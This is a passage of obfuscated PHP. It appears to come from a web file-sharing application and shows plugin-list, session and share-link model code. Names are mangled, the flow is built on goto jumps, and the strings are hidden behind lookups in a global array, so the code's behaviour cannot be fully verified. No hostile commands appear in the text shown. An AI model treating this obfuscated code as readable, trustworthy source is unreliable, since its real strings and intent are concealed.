array(); $c»¸£ËÄÀ© = $this->getConfigDefault($d¡ŸŸ…ƒ¡); } foreach ($c»¸£ËÄÀ© as $d×•Ãø„¦Ò => $Bíê“ç²Íó) { $d‰©øõ˜Ó[$d×•Ãø„¦Ò] = is_string($Bíê“ç²Íó) ? trim($Bíê“ç²Íó) : $Bíê“ç²Íó; } goto cÏƒ¸Ùáï£; B¤ñ²¿ß: $cÃ¿ŸÒ™ÒŠ =& $_SERVER[¦·]; $bÅ—ù»š = $this->loadList($d¡ŸŸ…ƒ¡); if (!$bÅ—ù»š) { return !1; } goto eù°±»•ó; aòä¤ƒ£: } public function viewList() { goto EùÂë—ÄÅ¤; e§ªºªÛ‘ö: return $c´Û½ÃµÀ…; goto b™×¯Ğª; EùÂë—ÄÅ¤: $F¹Â£—ÙåÒ =& $_SERVER[¦·]; $eÃÂñÉò¨ = $this->loadList(); $this->pluginScan($eÃÂñÉò¨); goto EœÍ¤É‘ÃÜ; EœÍ¤É‘ÃÜ: $eÃÂñÉò¨ = $this->loadPluginList(); $c´Û½ÃµÀ… = array(); foreach ($eÃÂñÉò¨ as $cëêå®¢Û => $E½¡æ‚Æö ) { unset($E½¡æ‚Æö [$F¹Â£—ÙåÒ[2218]], $E½¡æ‚Æö [$F¹Â£—ÙåÒ[6]]); $e°¥Êà“Í = PLUGIN_DIR . $E½¡æ‚Æö [$F¹Â£—ÙåÒ[28]] . $F¹Â£—ÙåÒ[2220]; if (!is_file($e°¥Êà“Í)) { continue; } $a¿¼Ò„»¢Ô = Hook::apply($E½¡æ‚Æö [$F¹Â£—ÙåÒ[28]] . $F¹Â£—ÙåÒ[2226]); if (is_array($a¿¼Ò„»¢Ô)) { $c´Û½ÃµÀ…[$cëêå®¢Û] = array_merge($E½¡æ‚Æö , $a¿¼Ò„»¢Ô); } } goto e§ªºªÛ‘ö; b™×¯Ğª: } private function loadPluginList() { $aä·¥°õ„ =& $_SERVER[¦·]; $F§İôŒ‡­Õ = $this->loadList(); if (strtolower(MOD) == $aä·¥°õ„[2227]) { return $F§İôŒ‡­Õ; } $BÉÇ§ê­Ã = Hook::trigger($aä·¥°õ„[2228], $F§İôŒ‡­Õ); if ($F§İôŒ‡­Õ && !$BÉÇ§ê­Ã) { die; } return $BÉÇ§ê­Ã ? $BÉÇ§ê­Ã : $F§İôŒ‡­Õ; } private function pluginScan($B‘“ñÏëÊ) { $bŒÂìÊ˜ÇŠ =& $_SERVER[¦·]; recursion_dir(PLUGIN_DIR, $c†µŒ‹Š³, $a Œ‘Ôšš, 0); foreach ($c†µŒ‹Š³ as $cà ½èƒ‹) { $dõ‡—‚¶Ï = get_path_this($cà ½èƒ‹); if (isset($B‘“ñÏëÊ[$dõ‡—‚¶Ï]) || !file_exists($cà ½èƒ‹ . $bŒÂìÊ˜ÇŠ[2229]) || !file_exists($cà ½èƒ‹ . $bŒÂìÊ˜ÇŠ[2220])) { continue; } Hook::apply($dõ‡—‚¶Ï . $bŒÂìÊ˜ÇŠ[2223]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\137\163\145\163\163\151\157\x6e"; public function get($aÂ¾Ôæó¢) { $a¢–†¯­‹’ =& $_SERVER[¦·]; $f¼¼³‰Œ… = $this->where(array($a¢–†¯­‹’[2230] => $aÂ¾Ôæó¢))->find(); if (!is_array($f¼¼³‰Œ…)) { return !1; } return $f¼¼³‰Œ…[$a¢–†¯­‹’[693]]; } public function set($aî‹¦µÏÍ, $DÚÃÖÑÀ¥µ, $bÆïºçà”Û = 3600) { $D²·Âéö‰™ =& $_SERVER[¦·]; $AìÓ©£éÉù = array($D²·Âéö‰™[2230] => $aî‹¦µÏÍ, $D²·Âéö‰™[2143] => $DÚÃÖÑÀ¥µ, $D²·Âéö‰™[2231] => $bÆïºçà”Û + time()); if (Session::get($D²·Âéö‰™[2232])) { $AìÓ©£éÉù[$D²·Âéö‰™[1441]] = Session::get($D²·Âéö‰™[2232]); } else { $AìÓ©£éÉù[$D²·Âéö‰™[1441]] = 0; } if ($this->get($aî‹¦µÏÍ)) { return $this->where(array($D²·Âéö‰™[2230] => $aî‹¦µÏÍ))->save($AìÓ©£éÉù); } else { return $this->add($AìÓ©£éÉù, array(), !0); } } public function remove($eîô¹‹¿¦) { return $this->where(array($_SERVER[¦·][2230] => $eîô¹‹¿¦))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¦·][2233] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\162\x74\x2c\165\x70\x64\x61\164\145", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\x72\145\141\164\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\164", "\146\165\156\x63\164\x69\157\156"), array("\157\160\x74\151\x6f\x6e\x73", '', "\151\156\163\x65\162\x74\54\x75\160\144\x61\x74\x65\x2c\163\145\x6c\145\x63\x74", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($b ÌŒôÈ Ü) { $aÄğÆÖÄ¿Œ =& $_SERVER[¦·]; $E£ ŠÇÔ„à = isset($b ÌŒôÈ Ü[0]) ? $b ÌŒôÈ Ü[0] : !1; return array($aÄğÆÖÄ¿Œ[2234] => array(USER_ID, $aÄğÆÖÄ¿Œ[2235]), $aÄğÆÖÄ¿Œ[2183] => array($E£ ŠÇÔ„à, $aÄğÆÖÄ¿Œ[2236])); } protected function listSimple() { $A¸¼Ãà›š« = array($_SERVER[¦·][1441] => USER_ID); $f²©ÑÚŠ‘» = $this->field($this->fieldList)->where($A¸¼Ãà›š«)->select(); return $f²©ÑÚŠ‘» ? $f²©ÑÚŠ‘» : array(); } protected function getInfo($CˆÎôÌ»Íæ, $A×ÔíÈºÔ = false) { $E¢ê„À™Í¨ =& $_SERVER[¦·]; if ($A×ÔíÈºÔ) { return $this->_getShareInfo(array($E¢ê„À™Í¨[441] => $CˆÎôÌ»Íæ)); } $fÂŸÌ¦é­’ = $this->cacheFunctionGet($E¢ê„À™Í¨[2237], $CˆÎôÌ»Íæ); return $fÂŸÌ¦é­’; } public function getInfoByHash($E°õÜñà³˜) { return $this->_getShareInfo(array($_SERVER[¦·][443] => $E°õÜñà³˜)); } public function getInfoByPath($A«æÙ×‚‘) { $BËÆ‡©ˆÚ =& $_SERVER[¦·]; $b›„ìó–» = array($BËÆ‡©ˆÚ[1441] => USER_ID, $BËÆ‡©ˆÚ[369] => $A«æÙ×‚‘); return $this->_getShareInfo($b›„ìó–»); } public function getInfoBySourcePath($Cİóˆ†ÁÖ…) { $aƒÑå×ç­ =& $_SERVER[¦·]; $b†ÄßÄÜÌÇ = array($aƒÑå×ç­[1441] => USER_ID, $aƒÑå×ç­[1022] => $Cİóˆ†ÁÖ…); return $this->_getShareInfo($b†ÄßÄÜÌÇ); } private function _getShareInfo($bÀ‘Î™Â¨Ô) { goto bª¡Ğ¶Øğè; bª¡Ğ¶Øğè: $AÆ×ŞÅƒ¯› =& $_SERVER[¦·]; $E”ª‚¶ô©â = $this->where($bÀ‘Î™Â¨Ô)->find(); if (!$E”ª‚¶ô©â) { return !1; } goto e¸Ã¹ÅãƒÛ; e¸Ã¹ÅãƒÛ: $bÀ‘Î™Â¨Ô = array($AÆ×ŞÅƒ¯›[441] => $E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[441]]); $CÖ…ƒèïÉ• = $AÆ×ŞÅƒ¯›[2238]; $eÕœ‰£ª°ö = Model($AÆ×ŞÅƒ¯›[538])->order($AÆ×ŞÅƒ¯›[367])->field($CÖ…ƒèïÉ•)->where($bÀ‘Î™Â¨Ô)->select(); goto CØºæµ¹Â›; CØºæµ¹Â›: if ($E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[369]] == $AÆ×ŞÅƒ¯›[470]) { $E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[391]] = IO::info($E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[1022]]); } else { $E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[391]] = Model($AÆ×ŞÅƒ¯›[1122])->pathInfo($E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[369]]); } $E”ª‚¶ô©â[$AÆ×ŞÅƒ¯›[2239]] = $eÕœ‰£ª°ö; return $E”ª‚¶ô©â; goto EéàšÉëã·; EéàšÉëã·: } protected function getInfoAuth($EŒœËŒ”ï¬) { $bÙ‡¼¾“Ñì =& $_SERVER[¦·]; $cë‡…³Ü½ = $this->getInfo($EŒœËŒ”ï¬); $cë‡…³Ü½[$bÙ‡¼¾“Ñì[376]] = Model($bÙ‡¼¾“Ñì[456])->authMake($cë‡…³Ü½[$bÙ‡¼¾“Ñì[2239]]); return $cë‡…³Ü½; } protected function listData($eô£ó„Ú¡Ÿ = null, $f›ƒä¶ééî = 300) { $Bˆéãñ“îÏ =& $_SERVER[¦·]; $cù½äãÉÎ = array(array($Bˆéãñ“îÏ[446] => array($Bˆéãñ“îÏ[928], 0), $Bˆéãñ“îÏ[448] => array($Bˆéãñ“îÏ[928], 0), $Bˆéãñ“îÏ[2240] => $Bˆéãñ“îÏ[2197])); if ($eô£ó„Ú¡Ÿ == $Bˆéãñ“îÏ[1878]) { $cù½äãÉÎ = array($Bˆéãñ“îÏ[446] => 1); } else { if ($eô£ó„Ú¡Ÿ == $Bˆéãñ“îÏ[1011]) { $cù½äãÉÎ = array($Bˆéãñ“îÏ[448] => 1); } } $cù½äãÉÎ[$Bˆéãñ“îÏ[1441]] = USER_ID; $bä¾£ŸÚÇš = $this->where($cù½äãÉÎ)->selectPage($f›ƒä¶ééî); return $bä¾£ŸÚÇš; } protected function listToMe($C›×©°–Û× = 300) { goto bìƒ£ìÂ…Â; bìƒ£ìÂ…Â: $F³â¤èß´¶ =& $_SERVER[¦·]; $B–È£‡è†é = Model($F³â¤èß´¶[2241])->userGroupParents(USER_ID); $eä´ÚòôÆî = array($F³â¤èß´¶[523] => SourceModel::TYPE_USER, $F³â¤èß´¶[458] => USER_ID); goto a§öÖÑÖ¾; fë†ÒÙÄ: $CÙá÷ˆôˆ¶ = $this->field($dÕÇÎ²ÍšÕ)->where($eä´ÚòôÆî)->select(); foreach ($CÙá÷ˆôˆ¶ as $EËÄà¢ÈÖè => &$fÇµÀ‹÷÷ª) { $fÇµÀ‹÷÷ª[$F³â¤èß´¶[2239]] = $B‰ğõØØÓ[$fÇµÀ‹÷÷ª[$F³â¤èß´¶[441]]]; } unset($fÇµÀ‹÷÷ª); goto cöõË¢òßÏ; a§öÖÑÖ¾: if ($B–È£‡è†é) { $eä´ÚòôÆî = array(array($F³â¤èß´¶[523] => SourceModel::TYPE_USER, $F³â¤èß´¶[458] => USER_ID), array($F³â¤èß´¶[523] => SourceModel::TYPE_GROUP, $F³â¤èß´¶[458] => array($F³â¤èß´¶[7], $B–È£‡è†é)), $F³â¤èß´¶[2240] => $F³â¤èß´¶[2197]); } $A… ¸é‰Ãè = Model($F³â¤èß´¶[538])->where($eä´ÚòôÆî)->selectPage($C›×©°–Û×); $B‰ğõØØÓ = array_to_keyvalue_group($A… ¸é‰Ãè[$F³â¤èß´¶[354]], $F³â¤èß´¶[441]); goto E©ŒæÇ¦¥; cöõË¢òßÏ: $b²®á‘ºÈ = array($F³â¤èß´¶[2243] => $CÙá÷ˆôˆ¶, $F³â¤èß´¶[2244] => $A… ¸é‰Ãè[$F³â¤èß´¶[351]]); return $b²®á‘ºÈ; goto dà¹ßèì÷; E©ŒæÇ¦¥: if (!$B‰ğõØØÓ) { return $A… ¸é‰Ãè; } $dÕÇÎ²ÍšÕ = $F³â¤èß´¶[2242]; $eä´ÚòôÆî = array($F³â¤èß´¶[441] => array($F³â¤èß´¶[384], array_keys($B‰ğõØØÓ))); goto fë†ÒÙÄ; dà¹ßèì÷: } protected function shareAdd($CŒÃòÁ•É, $b•×Ö¯»²) { $b¢ç¹Çõˆ× =& $_SERVER[¦·]; $a¸ô‘á²¿“ = $this->_addShareData($CŒÃòÁ•É, $b•×Ö¯»²); if (!empty($b•×Ö¯»²[$b¢ç¹Çõˆ×[2245]])) { $this->_shareAuthSet($a¸ô‘á²¿“, $b•×Ö¯»²[$b¢ç¹Çõˆ×[2245]]); } $this->shareEventAdd($CŒÃòÁ•É, $b•×Ö¯»², $b¢ç¹Çõˆ×[1014]); return $a¸ô‘á²¿“; } private function shareEventAdd($A›ÖŠ´½ç‚, $cá°ã…¨è, $EƒŸ¦¯šö = "\141\144\144") { goto b¡¼µ·õ”à; Eá…šèò: if ($a‡‘ ó¼ä[$a«øŸ¹Ä³œ[448]] == $a«øŸ¹Ä³œ[470] && $cá°ã…¨è[$a«øŸ¹Ä³œ[448]] == $a«øŸ¹Ä³œ[83]) { $d¹÷©ö‡³À = $a«øŸ¹Ä³œ[2247]; } if ($a‡‘ ó¼ä[$a«øŸ¹Ä³œ[448]] == $a«øŸ¹Ä³œ[83] && $cá°ã…¨è[$a«øŸ¹Ä³œ[448]] == $a«øŸ¹Ä³œ[470]) { $d¹÷©ö‡³À = $a«øŸ¹Ä³œ[2250]; } Model($a«øŸ¹Ä³œ[507])->eventShare($A›ÖŠ´½ç‚, $d¹÷©ö‡³À); goto a„•”æ³; b¡¼µ·õ”à: $a«øŸ¹Ä³œ =& $_SERVER[¦·]; if ($EƒŸ¦¯šö == $a«øŸ¹Ä³œ[1014]) { if ($cá°ã…¨è[$a«øŸ¹Ä³œ[446]] == $a«øŸ¹Ä³œ[83]) { Model($a«øŸ¹Ä³œ[507])->eventShare($A›ÖŠ´½ç‚, $a«øŸ¹Ä³œ[2246]); } if ($cá°ã…¨è[$a«øŸ¹Ä³œ[448]] == $a«øŸ¹Ä³œ[83]) { Model($a«øŸ¹Ä³œ[507])->eventShare($A›ÖŠ´½ç‚, $a«øŸ¹Ä³œ[2247]); } return; } $a‡‘ ó¼ä = $this->getInfoByPath($A›ÖŠ´½ç‚); goto b†â¡ëƒÇ¿; b†â¡ëƒÇ¿: $d¹÷©ö‡³À = $a«øŸ¹Ä³œ[2248]; if ($a‡‘ ó¼ä[$a«øŸ¹Ä³œ[446]] == $a«øŸ¹Ä³œ[470] && $cá°ã…¨è[$a«øŸ¹Ä³œ[446]] == $a«øŸ¹Ä³œ[83]) { $d¹÷©ö‡³À = $a«øŸ¹Ä³œ[2246]; } if ($a‡‘ ó¼ä[$a«øŸ¹Ä³œ[446]] == $a«øŸ¹Ä³œ[83] && $cá°ã…¨è[$a«øŸ¹Ä³œ[446]] == $a«øŸ¹Ä³œ[470]) { $d¹÷©ö‡³À = $a«øŸ¹Ä³œ[2249]; } goto Eá…šèò; a„•”æ³: return; goto D……•Ê‡É; D……•Ê‡É: } private function _addShareData($e„Ìõèğ¨§, $c®»¾¹ï” = array()) { goto eªòš²œ—; cØ´ÈÇˆò: $DíÖä„ù×ğ = $this->add($eÙÕÎåã¯¯); $Fİ¿¯”ší’ = array($fº²´¤Ü†ò[443] => short_id($DíÖä„ù×ğ)); $this->where(array($fº²´¤Ü†ò[440] => $DíÖä„ù×ğ))->save($Fİ¿¯”ší’); goto dÓòµ°÷š½; dÓòµ°÷š½: return $DíÖä„ù×ğ; goto aš…á Ù´À; eªòš²œ—: $fº²´¤Ü†ò =& $_SERVER[¦·]; $a‡µ“‘¶Ñö = array($fº²´¤Ü†ò[383] => $e„Ìõèğ¨§, $fº²´¤Ü†ò[1432] => USER_ID); if ($e„Ìõèğ¨§ == 0) { $a‡µ“‘¶Ñö = array($fº²´¤Ü†ò[2251] => $c®»¾¹ï”[$fº²´¤Ü†ò[1022]], $fº²´¤Ü†ò[1432] => USER_ID); } goto dÇÖ«Êˆ«; fŒ†›ÁÒÜõ: $eÙÕÎåã¯¯ = array($fº²´¤Ü†ò[1432] => USER_ID, $fº²´¤Ü†ò[383] => $e„Ìõèğ¨§, $fº²´¤Ü†ò[1347] => $fº²´¤Ü†ò[33], $fº²´¤Ü†ò[446] => 0, $fº²´¤Ü†ò[448] => 0, $fº²´¤Ü†ò[1022] => $fº²´¤Ü†ò[33], $fº²´¤Ü†ò[295] => $fº²´¤Ü†ò[33], $fº²´¤Ü†ò[804] => $fº²´¤Ü†ò[33], $fº²´¤Ü†ò[2252] => 0, $fº²´¤Ü†ò[2253] => 0, $fº²´¤Ü†ò[449] => 0, $fº²´¤Ü†ò[450] => $fº²´¤Ü†ò[33], $fº²´¤Ü†ò[443] => $fº²´¤Ü†ò[33]); $a†©î‚‡¹‹ = explode($fº²´¤Ü†ò[47], $fº²´¤Ü†ò[2254]); foreach ($a†©î‚‡¹‹ as $EíÄÙÑÆé) { if (!isset($c®»¾¹ï”[$EíÄÙÑÆé])) { continue; } $eÙÕÎåã¯¯[$EíÄÙÑÆé] = $c®»¾¹ï”[$EíÄÙÑÆé]; } goto cØ´ÈÇˆò; dÇÖ«Êˆ«: if ($c®šÙëˆŠ‘ = $this->where($a‡µ“‘¶Ñö)->find()) { return $c®šÙëˆŠ‘[$fº²´¤Ü†ò[441]]; } if ($e„Ìõèğ¨§ == 0) { $eº¬‹®Õ = array($fº²´¤Ü†ò[28] => get_path_this($c®»¾¹ï”[$fº²´¤Ü†ò[75]])); } else { $eº¬‹®Õ = Model($fº²´¤Ü†ò[753])->sourceInfo($e„Ìõèğ¨§); if (!$eº¬‹®Õ) { return !1; } } if (!$c®»¾¹ï”[$fº²´¤Ü†ò[1347]]) { $c®»¾¹ï”[$fº²´¤Ü†ò[1347]] = $eº¬‹®Õ[$fº²´¤Ü†ò[28]]; } goto fŒ†›ÁÒÜõ; aš…á Ù´À: } private function _shareAuthSet($A²´‹Ç„¹ì, $aÑÛ´ç¡») { goto AÔ»ÍËŠè; AÔ»ÍËŠè: $f£†öšºóÜ =& $_SERVER[¦·]; if (!is_array($aÑÛ´ç¡»)) { return !1; } $fŠ²ÒÚ¹‡ = Model($f£†öšºóÜ[2255]); goto b›ÈÓ¨ôì; d›¾ÈŸ©Ÿ: return $fŠ²ÒÚ¹‡->addAll($a•ÊäšŠ, array(), !0); goto c¼Ûš…ÉŒå; b›ÈÓ¨ôì: $fŠ²ÒÚ¹‡->where(array($f£†öšºóÜ[441] => $A²´‹Ç„¹ì))->delete(); $a•ÊäšŠ = array(); foreach ($aÑÛ´ç¡» as $e‚£ÔºìœË) { $D…É¶ŠêŞ— = SourceModel::TYPE_USER; if ($e‚£ÔºìœË[$f£†öšºóÜ[371]] == SourceModel::TYPE_GROUP) { $D…É¶ŠêŞ— = SourceModel::TYPE_GROUP; } $DöâŠª¶ = array($f£†öšºóÜ[441] => $A²´‹Ç„¹ì, $f£†öšºóÜ[371] => $D…É¶ŠêŞ—, $f£†öšºóÜ[458] => intval($e‚£ÔºìœË[$f£†öšºóÜ[458]]), $f£†öšºóÜ[2256] => 0, $f£†öšºóÜ[2257] => -1); if ($e‚£ÔºìœË[$f£†öšºóÜ[2256]]) { $DöâŠª¶[$f£†öšºóÜ[2256]] = $e‚£ÔºìœË[$f£†öšºóÜ[2256]]; } else { if ($e‚£ÔºìœË[$f£†öšºóÜ[2257]]) { $DöâŠª¶[$f£†öšºóÜ[2257]] = $e‚£ÔºìœË[$f£†öšºóÜ[2257]]; } } $a•ÊäšŠ[] = $DöâŠª¶; } goto d›¾ÈŸ©Ÿ; c¼Ûš…ÉŒå: } public function numViewAdd($e‡†ªÁÙ‰ô) { $d£¾ ´Ú† =& $_SERVER[¦·]; $cô¤ƒ·öºØ = array($d£¾ ´Ú†[440] => $e‡†ªÁÙ‰ô); $this->where($cô¤ƒ·öºØ)->setAdd($d£¾ ´Ú†[2252]); } public function numDownloadAdd($BôÃ°¢Ì») { $c²ÄñÖÛ¦ª =& $_SERVER[¦·]; $CÉî ‡‡º¯ = array($c²ÄñÖÛ¦ª[440] => $BôÃ°¢Ì»); $this->where($CÉî ‡‡º¯)->setAdd($c²ÄñÖÛ¦ª[2253]); } protected function shareEdit($EÈì£ÁˆõØ, $fÑ”˜ğ³“¢) { goto cñÈË°‚¨Ø; FŞïõÀ×Ê“: if (isset($fÑ”˜ğ³“¢[$c¡ì‹¤Ì™¨[2245]])) { $this->_shareAuthSet($EÈì£ÁˆõØ, $fÑ”˜ğ³“¢[$c¡ì‹¤Ì™¨[2245]]); } return !0; goto fùéˆ±°œ¹; EŒÓ› Õ‚: $this->_checkLinkShare($fÑ”˜ğ³“¢, $cÊ¶‡»’ŞÌ); $EÌØ‹°òÎ‚ = array(); $C˜è×êÅ™ = explode($c¡ì‹¤Ì™¨[47], $c¡ì‹¤Ì™¨[2258]); goto eÓ™è™Ï¦; eÓ™è™Ï¦: foreach ($C˜è×êÅ™ as $eîÙÊõÃóÂ) { if (!array_key_exists($eîÙÊõÃóÂ, $fÑ”˜ğ³“¢)) { continue; } $EÌØ‹°òÎ‚[$eîÙÊõÃóÂ] = $fÑ”˜ğ³“¢[$eîÙÊõÃóÂ]; } $this->shareEventAdd($cÊ¶‡»’ŞÌ[$c¡ì‹¤Ì™¨[369]], $fÑ”˜ğ³“¢, $c¡ì‹¤Ì™¨[2079]); $this->where(array($c¡ì‹¤Ì™¨[440] => $EÈì£ÁˆõØ))->save($EÌØ‹°òÎ‚); goto FŞïõÀ×Ê“; cñÈË°‚¨Ø: $c¡ì‹¤Ì™¨ =& $_SERVER[¦·]; $cÊ¶‡»’ŞÌ = $this->getInfo($EÈì£ÁˆõØ); if (!$cÊ¶‡»’ŞÌ) { return !1; } goto EŒÓ› Õ‚; fùéˆ±°œ¹: } private function _checkLinkShare($BºÃ§´„½, $CÛ°âÔËÍ) { goto cŠİ ßÆƒ±; aÒÑ†£¦‘À: if ($CÛ°âÔËÍ[$A‰Œ÷¿ÂÖ[391]][$A‰Œ÷¿ÂÖ[29]] != $A‰Œ÷¿ÂÖ[167]) { $fá¼ã“èà¾ = $this->_folderReport($bĞª†âï¥Ë); if (!$fá¼ã“èà¾) { return; } show_json(LNG($A‰Œ÷¿ÂÖ[2259]) . $A‰Œ÷¿ÂÖ[2260] . $fá¼ã“èà¾, !1); } $dÇİ•Ø‘’› = Model($A‰Œ÷¿ÂÖ[753])->fileInfoGet($CÛ°âÔËÍ[$A‰Œ÷¿ÂÖ[391]][$A‰Œ÷¿ÂÖ[369]]); if (!$dÇİ•Ø‘’›) { return; } goto fŠ‘Ş–«õí; cŠİ ßÆƒ±: $A‰Œ÷¿ÂÖ =& $_SERVER[¦·]; if ($BºÃ§´„½[$A‰Œ÷¿ÂÖ[446]] != $A‰Œ÷¿ÂÖ[83]) { return; } $bĞª†âï¥Ë = $CÛ°âÔËÍ[$A‰Œ÷¿ÂÖ[391]][$A‰Œ÷¿ÂÖ[369]]; goto aÒÑ†£¦‘À; fŠ‘Ş–«õí: $fòÇìñÎ = $this->shareFileMeta($dÇİ•Ø‘’›[$A‰Œ÷¿ÂÖ[419]]); if (isset($fòÇìñÎ[$A‰Œ÷¿ÂÖ[359]]) && $fòÇìñÎ[$A‰Œ÷¿ÂÖ[359]] == $A‰Œ÷¿ÂÖ[83]) { show_json(LNG($A‰Œ÷¿ÂÖ[2261]), !1); } goto d§®İ‰À­; d§®İ‰À­: } private function _folderReport($bì±‚šˆ˜Æ) { goto eÓç»ñÔ±¡; BÍ¼“Š›°: $Fé£´…ø­Æ = substr($DÙÄ’Ó±º‹[$dáÜ§¨Õ®‹[461]], strpos($DÙÄ’Ó±º‹[$dáÜ§¨Õ®‹[461]], $a’÷¹’¢§ø)); $cè¥å¬Äà = array($dáÜ§¨Õ®‹[369] => array($dáÜ§¨Õ®‹[7], trim($Fé£´…ø­Æ, $dáÜ§¨Õ®‹[47]))); $e¸½ÖòÅÏ‚ = Model($dáÜ§¨Õ®‹[753])->where($cè¥å¬Äà)->field($dáÜ§¨Õ®‹[28])->select(); goto eß‹ëÔŒÁ; BÇùµ…°øš: if (!$Fáù¦ííÜÆ) { return !1; } $Fáù¦ííÜÆ = array_to_keyvalue($Fáù¦ííÜÆ, $dáÜ§¨Õ®‹[33], $dáÜ§¨Õ®‹[419]); $a’÷¹’¢§ø = $dáÜ§¨Õ®‹[47] . $bì±‚šˆ˜Æ . $dáÜ§¨Õ®‹[47]; goto c°êğŠÌì; eÓç»ñÔ±¡: $dáÜ§¨Õ®‹ =& $_SERVER[¦·]; $cè¥å¬Äà = array($dáÜ§¨Õ®‹[419] => array($dáÜ§¨Õ®‹[928], 0), $dáÜ§¨Õ®‹[690] => 3); $Fáù¦ííÜÆ = Model($dáÜ§¨Õ®‹[2262])->where($cè¥å¬Äà)->field($dáÜ§¨Õ®‹[419])->select(); goto BÇùµ…°øš; c°êğŠÌì: $cè¥å¬Äà = array($dáÜ§¨Õ®‹[419] => array($dáÜ§¨Õ®‹[7], $Fáù¦ííÜÆ), $dáÜ§¨Õ®‹[461] => array($dáÜ§¨Õ®‹[752], "\45{$a’÷¹’¢§ø}\45"), $dáÜ§¨Õ®‹[397] => 0); $DÙÄ’Ó±º‹ = Model($dáÜ§¨Õ®‹[753])->where($cè¥å¬Äà)->field($dáÜ§¨Õ®‹[2263])->find(); if (!$DÙÄ’Ó±º‹) { return !1; } goto BÍ¼“Š›°; eß‹ëÔŒÁ: $d¨İ£Ù™”é = array_to_keyvalue($e¸½ÖòÅÏ‚, $dáÜ§¨Õ®‹[33], $dáÜ§¨Õ®‹[28]); $d¨İ£Ù™”é[] = $DÙÄ’Ó±º‹[$dáÜ§¨Õ®‹[28]]; return implode($dáÜ§¨Õ®‹[8], $d¨İ£Ù™”é); goto AÃĞÑôŒä; AÃĞÑôŒä: } protected function remove($A÷Ûè—†Šâ) { goto C©ŠÂòÔùœ; bŒóíÖ«øì: $b…¦ÀŞÎ»Â = $this->where($c†Ï×ìÉÃÙ)->delete(); if ($b…¦ÀŞÎ»Â) { Model($a™ÈÇİŠ¬À[538])->where(array($a™ÈÇİŠ¬À[441] => $A÷Ûè—†Šâ))->delete(); } $FßÆñ…İ÷¶ = is_array($A÷Ûè—†Šâ) ? $A÷Ûè—†Šâ[1] : array($A÷Ûè—†Šâ); goto CÏ³ÍÃÊê; CÏ³ÍÃÊê: for ($cË£ùÓ­— = 0; $cË£ùÓ­— < count($FßÆñ…İ÷¶); $cË£ùÓ­—++) { $C×’ìãªóà = $this->getInfo($FßÆñ…İ÷¶[$cË£ùÓ­—]); if ($C×’ìãªóà[$a™ÈÇİŠ¬À[448]] == $a™ÈÇİŠ¬À[83]) { Model($a™ÈÇİŠ¬À[507])->eventShare($C×’ìãªóà[$a™ÈÇİŠ¬À[369]], $a™ÈÇİŠ¬À[2250]); } if ($C×’ìãªóà[$a™ÈÇİŠ¬À[446]] == $a™ÈÇİŠ¬À[83]) { Model($a™ÈÇİŠ¬À[507])->eventShare($C×’ìãªóà[$a™ÈÇİŠ¬À[369]], $a™ÈÇİŠ¬À[2249]); } } return $b…¦ÀŞÎ»Â; goto FƒŞÑ±š¦ˆ; C©ŠÂòÔùœ: $a™ÈÇİŠ¬À =& $_SERVER[¦·]; if (is_array($A÷Ûè—†Šâ)) { $A÷Ûè—†Šâ = array($a™ÈÇİŠ¬À[7], $A÷Ûè—†Šâ); } $c†Ï×ìÉÃÙ = array($a™ÈÇİŠ¬À[441] => $A÷Ûè—†Šâ); goto bŒóíÖ«øì; FƒŞÑ±š¦ˆ: } protected function removeBySource($cÑŒêÂìŒ) { goto bâÇ³·ì“; bâÇ³·ì“: $Bç“”Œ×’ã =& $_SERVER[¦·]; $DêË‰Ãİñ¹ = array($Bç“”Œ×’ã[383] => array($Bç“”Œ×’ã[384], $cÑŒêÂìŒ)); $cå¯ê½†ë‰ = $this->field($Bç“”Œ×’ã[441])->where($DêË‰Ãİñ¹)->select(); goto DËÈŠèÅ‡ğ; a–Úôô¥«¼: $this->where($DêË‰Ãİñ¹)->delete(); Model($Bç“”Œ×’ã[538])->where($DêË‰Ãİñ¹)->delete(); goto fóÊ…öãëÀ; DËÈŠèÅ‡ğ: $cå¯ê½†ë‰ = array_to_keyvalue($cå¯ê½†ë‰, $Bç“”Œ×’ã[33], $Bç“”Œ×’ã[441]); if (!$cå¯ê½†ë‰) { return; } $DêË‰Ãİñ¹ = array($Bç“”Œ×’ã[440] => array($Bç“”Œ×’ã[384], $cå¯ê½†ë‰)); goto a–Úôô¥«¼; fóÊ…öãëÀ: } public function listAll($e¥Ã»öÑ±Ã) { goto EÏéœËùõ; Bó ¬‡Â˜Ç: if ($e¥Ã»öÑ±Ã[$A…ªø§Ìù®[703]]) { $F­ãÌ¾‘Æù = $e¥Ã»öÑ±Ã[$A…ªø§Ìù®[449]] ? $e¥Ã»öÑ±Ã[$A…ªø§Ìù®[449]] : strtotime(date($A…ªø§Ìù®[2264])); $a§•ñÎƒÅà[$A…ªø§Ìù®[187]] = array($A…ªø§Ìù®[321], array($e¥Ã»öÑ±Ã[$A…ªø§Ìù®[703]], $F­ãÌ¾‘Æù)); } if ($e¥Ã»öÑ±Ã[$A…ªø§Ìù®[29]]) { $a§•ñÎƒÅà[$e¥Ã»öÑ±Ã[$A…ªø§Ìù®[29]]] = 1; } else { $a§•ñÎƒÅà[] = array($A…ªø§Ìù®[446] => array($A…ªø§Ìù®[928], 0), $A…ªø§Ìù®[448] => array($A…ªø§Ìù®[928], 0), $A…ªø§Ìù®[2240] => $A…ªø§Ìù®[2197]); } if ($e¥Ã»öÑ±Ã[$A…ªø§Ìù®[2193]]) { $a§•ñÎƒÅà[] = array($A…ªø§Ìù®[443] => $e¥Ã»öÑ±Ã[$A…ªø§Ìù®[2193]], $A…ªø§Ìù®[1347] => array($A…ªø§Ìù®[752], 